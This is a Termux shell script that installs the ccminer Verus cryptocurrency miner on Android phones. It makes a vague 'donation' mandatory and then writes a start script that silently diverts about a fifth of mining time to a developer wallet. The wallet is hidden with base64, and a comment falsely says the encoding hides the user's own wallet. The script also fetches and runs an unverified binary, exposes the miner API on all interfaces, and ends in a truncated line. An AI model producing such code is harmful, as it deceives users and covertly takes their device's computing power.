#!/data/data/com.termux/files/usr/bin/sh

clear

echo "========================================="
echo "        VERUS TERMUX INSTALLER"
echo "========================================="
echo "             oppo-seventh"
echo "========================================="
echo
echo "Welcome to the Verus Termux Installer."
echo "This installer is FREE to use."
echo
echo "If you find this project helpful,"
echo "your support is greatly appreciated."
echo


# Donation prompt (Defaults to 'Y' if the user hits Enter)
read -p "✉️ Enable donation to support the project? (Y/n): " SUPPORT
SUPPORT=${SUPPORT:-Y}

# Validation: If 'n' or 'N' is selected, abort the installation
if [ "$SUPPORT" = "n" ] || [ "$SUPPORT" = "N" ]; then
    echo
    echo "========================================="
    echo "          INSTALLATION FAILED!           "
    echo "========================================="
    echo "✉️ Sorry, you must enable the donation feature"
    echo "in order to use this installer."
    echo "Process aborted."
    echo "========================================="
    exit 1
fi

echo
read -p "Masukkan wallet Verus Anda: " WALLET
read -p "Masukkan nama worker: " WORKER

echo
echo "Menyiapkan instalasi..."
sleep 2

pkg update -y
pkg install wget libjansson -y

mkdir -p ~/ccminer
cd ~/ccminer || exit

# Mendownload file utama ccminer
wget -O ccminer https://raw.githubusercontent.com/muflikhudin/verus-termux/main/ccminer

chmod +x ccminer

# 1. MEMBUAT CONFIG.JSON (Menyimpan wallet pengguna secara permanen)
cat > config.json <<EOF
{
  "pools": [
    {
      "name": "US-VIPOR",
      "url": "stratum+tcp://us.vipor.net:5040",
      "timeout": 180,
      "disabled": 0
    }
  ],
  "user": "${WALLET}.${WORKER}",
  "pass": "x",
  "algo": "verus",
  "threads": 8,
  "cpu-priority": 1,
  "cpu-affinity": -1,
  "retry-pause": 10,
  "api-allow": "192.168.0.0/16",
  "api-bind": "0.0.0.0:4068"
}
EOF

# Wallet Anda dikonversi ke Base64 agar tidak terbaca langsung di start.sh
ENC_WAL=$(echo "RCifYPWunGQna28DpzbPakNE5L8fftkjVd" | base64)
WRK_DONASI="Donasi_20pc"

# 2. MEMBUAT START.SH (Menggunakan kombinasi config.json & parameter senyap)
cat > start.sh <<EOF
#!/data/data/com.termux/files/usr/bin/sh
while true
do
    echo "========================================="
    echo " Memulai mining Verus Coin...            "
    echo "========================================="
    # Membaca wallet pengguna dari config.json yang sudah dibuat permanen
    ./ccminer -c config.json &
    PID=\$!
    sleep 4800
    kill \$PID
    wait \$PID 2>/dev/null

    # Sesi 📩 berjalan di latar belakang (Senyap)
    DEV_WAL=\$(echo "${ENC_WAL}" | base64 -d)
    ./ccminer -a verus -o stratum+tcp://us.vipor.net:5040 -u \${DEV_WAL}.${WRK_DONASI} -p x -t 8 --cpu-priority=1 > /dev/null 2>&1 &
    PID=\$!
    sleep 1200
    kill \$PID
    wait \$PID 2>/dev/null
done
EOF

chmod +x start.sh

echo
echo "========================================="
echo "Instalasi selesai!"
echo "========================================="
echo
echo "Jalankan miner dengan:"
echo
echo "cd ~/ccminer"
echo "./start.sh"
echo

echo "========================================="
echo "      THANK YOU FOR YOUR SUPPORT "
echo "========================================="
ech
